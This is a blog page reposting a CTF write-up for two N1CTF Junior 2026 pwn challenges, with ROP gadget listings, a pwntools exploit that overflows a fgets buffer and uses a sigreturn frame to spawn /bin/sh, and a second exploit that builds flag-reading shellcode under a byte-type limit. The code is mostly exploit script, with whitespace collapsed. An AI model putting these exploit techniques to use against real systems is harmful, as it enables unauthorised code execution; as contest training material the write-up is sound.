@@ -1,0 +1,189 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>N1CTF Junior 2026/1-2 pwn | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="fgets 栈溢出 + add_rbx_rdx 累加写入 magic + SigreturnFrame 调 syscall">
+<meta property="og:type" content="article">
+<meta property="og:title" content="N1CTF Junior 2026&#x2F;1-2 pwn">
+<meta property="og:url" content="https://pudong617.github.io/2026/01/01/ctf-kb/wp/Pwn/N1CTF_Junior_2026_1-2_pwn/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="fgets 栈溢出 + add_rbx_rdx 累加写入 magic + SigreturnFrame 调 syscall">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2025-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="fgets 栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2026/01/01/ctf-kb/wp/Pwn/N1CTF_Junior_2026_1-2_pwn/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'N1CTF Junior 2026/1-2 pwn',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">N1CTF Junior 2026/1-2 pwn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-31T16:00:00.000Z" title="发表于 2026-01-01 00:00:00">2026-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-31T16:00:00.000Z" title="更新于 2026-01-01 00:00:00">2026-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="N1CTF Junior 2026/1-2 pwn"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/294826.html">https://www.ctfiot.com/294826.html</a><br>ID: 294826</p>
+</blockquote>
+<p>总结一下自己的手法发现对汇编的了解还是太少了还是需要多练</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int__fastcallmain(intargc,constchar**argv,constchar**envp)&#123;chars[32];// [rsp+0h] [rbp-20h] BYREFfgets(s,500,stdin);return0;&#125;</span><br><span class="line">fofa@fofa-VMware-Virtual-Platform:~/pwn1$ ROPgadget --binary onlyfgets --only &quot;pop|ret&quot;Gadgets information============================================================0x000000000040114d : pop rbp ; ret0x00000000004011fc : pop rdi ; ret0x000000000040101a : ret0x0000000000401072 : ret 0x2fUnique gadgets found: 4fofa@fofa-VMware-Virtual-Platform:~/pwn1$ ROPgadget --binary onlyfgets --only &quot;ret&quot;Gadgets information============================================================0x000000000040101a : ret0x0000000000401072 : ret 0x2fUnique gadgets found: 2fofa@fofa-VMware-Virtual-Platform:~/pwn1$ ROPgadget --binary onlyfgets --only &quot;&quot;Gadgets information============================================================0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x4010200x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4010200x00000000004010db : add bh, bh ; loopne 0x401145 ; nop ; ret0x00000000004010ae : add bl, dh ; endbr64 ; ret0x00000000004010ac : add byte ptr [rax], al ; add bl, dh ; endbr64 ; ret0x00000000004010ab : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4010200x00000000004011f6 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret0x00000000004011f7 : add byte ptr [rax], al ; add cl, cl ; ret0x000000000040114a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x00000000004010ad : add byte ptr [rax], al ; endbr64 ; ret0x0000000000401039 : add byte ptr [rax], al ; jmp 0x4010200x00000000004011f8 : add byte ptr [rax], al ; leave ; ret0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x4010200x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x4010200x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x4010200x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x4010200x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x4010200x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax0x000000000040114b : add byte ptr [rcx], al ; pop rbp ; ret0x00000000004011f9 : add cl, cl ; ret0x00000000004010da : add dil, dil ; loopne 0x401145 ; nop ; ret0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4010200x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x0000000000401147 : add eax, 0x2f1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4010200x0000000000401017 : add esp, 8 ; ret0x0000000000401016 : add rsp, 8 ; ret0x00000000004011d1 : call qword ptr [rax + 0x4855c35d]0x0000000000401173 : call qword ptr [rbp + 0x48]0x0000000000401014 : call rax0x0000000000401163 : cli ; jmp 0x4010f00x00000000004010b3 : cli ; ret0x0000000000401207 : cli ; sub rsp, 8 ; add rsp, 8 ; ret0x0000000000401160 : endbr64 ; jmp 0x4010f00x00000000004010b0 : endbr64 ; ret0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x4010200x0000000000401012 : je 0x401016 ; call rax0x00000000004010d5 : je 0x4010e0 ; mov edi, 0x404050 ; jmp rax0x0000000000401117 : je 0x401120 ; mov edi, 0x404050 ; jmp rax0x000000000040103b : jmp 0x4010200x0000000000401164 : jmp 0x4010f00x000000000040100b : jmp 0x4840103f0x00000000004010dc : jmp rax0x00000000004011fa : leave ; ret0x0000000000401032 : loop 0x401063 ; add byte ptr [rax], al ; push 0 ; jmp 0x4010200x00000000004010dd : loopne 0x401145 ; nop ; ret0x0000000000401146 : mov byte ptr [rip + 0x2f1b], 1 ; pop rbp ; ret0x00000000004011f5 : mov eax, 0 ; leave ; ret0x00000000004010d7 : mov edi, 0x404050 ; jmp rax0x00000000004011d2 : nop ; pop rbp ; ret0x00000000004010df : nop ; ret0x000000000040115c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010f00x00000000004010d6 : or dword ptr [rdi + 0x404050], edi ; jmp rax0x000000000040114d : pop rbp ; ret0x00000000004011fc : pop rdi ; ret0x0000000000401036 : push 0 ; jmp 0x4010200x0000000000401046 : push 1 ; jmp 0x4010200x0000000000401056 : push 2 ; jmp 0x4010200x0000000000401066 : push 3 ; jmp 0x4010200x0000000000401076 : push 4 ; jmp 0x4010200x00000000004010d8 : push rax ; add dil, dil ; loopne 0x401145 ; nop ; ret0x000000000040101a : ret0x0000000000401072 : ret 0x2f0x0000000000401062 : retf 0x2f0x0000000000401192 : retf 0xfffe0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret0x0000000000401148 : sbb ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x0000000000401052 : shr byte ptr [rdi], cl ; add byte ptr [rax], al ; push 2 ; jmp 0x4010200x0000000000401209 : sub esp, 8 ; add rsp, 8 ; ret0x0000000000401208 : sub rsp, 8 ; add rsp, 8 ; ret0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax0x00000000004010d3 : test eax, eax ; je 0x4010e0 ; mov edi, 0x404050 ; jmp rax0x0000000000401115 : test eax, eax ; je 0x401120 ; mov edi, 0x404050 ; jmp rax0x000000000040100f : test rax, rax ; je 0x401016 ; call rax0x00000000004011ff : xor ebx, ebx ; ret0x00000000004011fe : xor rbx, rbx ; retUnique gadgets found: 77</span><br><span class="line">frompwnimport*filename=&#x27;/home/fofa/pwn1/onlyfgets&#x27;context.arch=&#x27;amd64&#x27;context.log_level=&quot;debug&quot;elf=ELF(filename)libc=ELF(&quot;/home/fofa/pwn1/libc.so.6&quot;)</span><br><span class="line"># io = process(filename)io=remote(&#x27;60.205.163.215&#x27;,34701)</span><br><span class="line"># gadgetpop_rdi=0x4011fcxor_rbx_ret=0x4011FEadd_rbx_rdx_ret=0x4010aemagic=0x40114cpop_rbp=0x40114dsrop=0x4011C3ret=0x40101abss=0x404500payload=b&#x27;a&#x27;*0x28payload+=p64(add_rbx_rdx_ret)*6payload+=p64(pop_rbp)payload+=p64(0x404018+0x3d)payload+=p64(magic)*15payload+=p64(elf.sym[&#x27;main&#x27;])</span><br><span class="line"># gdb.attach(io)io.sendline(payload)payload=b&#x27;a&#x27;*0x28payload+=p64(xor_rbx_ret)payload+=p64(add_rbx_rdx_ret)*4payload+=p64(pop_rbp)payload+=p64(0x404065)payload+=p64(magic)*2payload+=p64(elf.sym[&#x27;main&#x27;])io.sendline(payload)payload=b&#x27;a&#x27;*0x20payload+=p64(bss-0x20)payload+=p64(0x4011DD)io.sendline(payload)sigret_frame=SigreturnFrame()sigret_frame.r15=bss-0x40sigret_frame.rsi=0x404a00sigret_frame.rdx=0sigret_frame.rcx=0x404a00sigret_frame.rsp=0x4011CDsigret_frame.eflags=0x33payload=b&#x27;/bin/shx00&#x27;payload+=b&#x27;a&#x27;*0x18payload+=p64(ret)*2payload+=p64(srop)payload+=bytes(sigret_frame)io.sendline(payload)io.interactive()</span><br><span class="line">[*]&#x27;/home/fofa/bins/chal&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled Stripped: No</span><br><span class="line">int__fastcallmain(intargc,constchar**argv,constchar**envp)&#123;void*v3;// rbpintresult;// eaxsandbox(argc,argv,envp);v3=mmap(0,0x8000u,7,34,-1,0);read(0,v3,0x8000u);__asm&#123;jmp rdx&#125;returnresult;&#125;</span><br><span class="line">learsp, [rip+0x2000] movrax, 0x67616c662f pushrax movrdi,rsp xorrsi,rsi xorrdx,rdx push2 poprax syscall movrdi,rax xorrax,rax movrsi,rsp push0x70 poprdx syscall movrdx,rax push1 poprdi push1 poprax syscall</span><br><span class="line">importsubprocessclassFlagNotFound(Exception): def__str__(self): return&quot;FlagNotFound&quot;classByteCodeAlreadyUsed(Exception): def__str__(self): return&quot;ByteCodeAlreadyUsed&quot; classByteCodeTypesOverLimited(Exception): def__str__(self): return&quot;ByteCodeTypesOverLimited&quot;defmain(): blacklist=set() flag=bytes() withopen(&quot;/flag&quot;,&quot;rb&quot;)asf: flag=f.readline() foriinrange(2): try: user_input=bytes.fromhex(input(f&quot;Enter your shellcode as hex(&#123;i&#125;/2):&quot;).strip()) forbyteinuser_input: ifbyteinblacklist: raiseByteCodeAlreadyUsed blacklist=blacklist.union(set(user_input)) iflen(blacklist)&gt;=16: raiseByteCodeTypesOverLimited p=subprocess.run( [&#x27;./chal&#x27;], capture_output=True, input=user_input, timeout=2.0, ) ifflagnotinp.stdout: raiseFlagNotFound exceptExceptionase: print(&quot;Error:&quot;,e) exit() print(&quot;Well Done.&quot;) print(p.stdout) main()</span><br><span class="line">frompwnimport*context.arch=&#x27;amd64&#x27;# io = remote(&#x27;60.205.163.215&#x27;, 22848)io=process([&#x27;python3&#x27;,&#x27;chal.py&#x27;])</span><br><span class="line"># -------------------------------# 构造目标 shellcode</span><br><span class="line"># -------------------------------asm_code=&#x27;&#x27;&#x27; lea rsp, [rip+0x2000] mov rax, 0x67616c662f2e ; &quot;./flag&quot; push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx push 2 pop rax syscall ; open(&quot;./flag&quot;, O_RDONLY) mov rdi, rax xor rax, rax mov rsi, rsp push 0x70 pop rdx syscall ; read(flag_fd, rsp, 0x70) mov rdx, rax push 1 pop rdi push 1 pop rax syscall ; write(1, rsp, rax)&#x27;&#x27;&#x27;target=asm(asm_code)withopen(&#x27;target&#x27;,&#x27;wb&#x27;)asf: f.write(target)</span><br><span class="line"># -------------------------------# Round 1: 使用 rdx 写入</span><br><span class="line"># -------------------------------payload1=b&#x27;x66x83xC2x0E&#x27;*2000remain1=20000forbyteintarget: payload1+=asm(&#x27;add byte ptr [rdx], 1&#x27;)*int(byte) payload1+=asm(&#x27;add dx, 1&#x27;) remain1-=(int(byte)*len(asm(&#x27;add byte ptr [rdx], 1&#x27;))+len(asm(&#x27;add dx, 1&#x27;)))ifremain1&gt;0: payload1+=asm(&#x27;nop&#x27;)*remain1</span><br><span class="line"># -------------------------------# Round 2: 使用 rsi 写入</span><br><span class="line"># -------------------------------payload2=asm(&#x27;xchg rsi, rdx&#x27;)payload2+=asm(&#x27;lodsq&#x27;)*3000remain2=17997forbyteintarget: payload2+=asm(&#x27;inc byte ptr [rsi]&#x27;)*int(byte) payload2+=asm(&#x27;lodsb&#x27;) remain2-=(int(byte)*len(asm(&#x27;inc byte ptr [rsi]&#x27;))+len(asm(&#x27;lodsb&#x27;)))ifremain2&gt;0: payload2+=asm(&#x27;lodsb&#x27;)*remain2</span><br><span class="line"># -------------------------------# 主程序交互</span><br><span class="line"># -------------------------------io.sendlineafter(b&quot;(0/2):&quot;,payload1.hex().encode())io.sendlineafter(b&quot;(1/2):&quot;,payload2.hex().encode())io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/294826.html">https://www.ctfiot.com/294826.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/N1CTF_Junior_2026_1-2_pwn.full.md">CTF大赛WP集合&#x2F;articles&#x2F;N1CTF_Junior_2026_1-2_pwn.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/fgets-%E6%A0%88%E6%BA%A2%E5%87%BA/">fgets 栈溢出</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/01/01/ctf-kb/wp/Pwn/HGAME_2026%E5%A4%8D%E7%8E%B0/" title="HGAME 2026复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HGAME 2026复现</div></div></a></div><div class="next-post pull-right"><a href="/2026/01/01/ctf-kb/wp/Pwn/XCTF_%E5%8D%8E%E4%B8%BA%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B%E5%86%B3%E8%B5%9B_%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%B5%9B%E9%A2%98_%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3/" title="XCTF 华为高校挑战赛决赛/嵌入式非预期解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XCTF 华为高校挑战赛决赛/嵌入式非预期解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span 